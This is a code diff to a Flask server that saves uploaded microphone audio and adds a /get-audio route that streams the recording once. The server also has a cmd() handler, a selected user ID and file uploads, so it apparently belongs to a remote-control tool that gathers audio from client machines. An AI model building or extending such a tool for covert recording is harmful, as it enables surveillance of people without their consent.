@@ -12,7 +12,7 @@ firstReload = True
 timezone = ZoneInfo("Asia/Kolkata")
 startTime = time()
 spam = False
-send = "none"
+send = False
 selected_user = "93"
 output = ""
 control_data = {}
@@ -517,12 +517,27 @@ def cmd():
 	
 @app.route("/audio",methods=["GET","POST"])
 def audio():
+	global send
 	if request.method == "POST":
 		with open(os.path.join(STATIC_FOLDER,"mic","audio.wav"),"wb") as file:
 			file.write(request.data)
-		with open(os.path.join(STATIC_FOLDER,"mic","time.txt"),"w") as file:
-			file.write(str(datetime.now()))
+			send = True
 	return "done"
+	
+@app.route("/get-audio",methods=["GET","POST"])
+def stream_audio():
+    global send
+    def generate():
+        global send
+        with open(os.path.join(STATIC_FOLDER,"mic",'audio.wav'), 'rb') as audio_file:
+                while chunk := audio_file.read(1024):
+                	yield chunk
+        send = False
+    if send:                  
+  	  return Response(generate(), mimetype="audio/wav")
+    else:
+    	return "none",204  	 
+		
 @app.route("/upload-files",methods=["POST", "GET"])
 def upload_files():
 	if request.method == "POST":
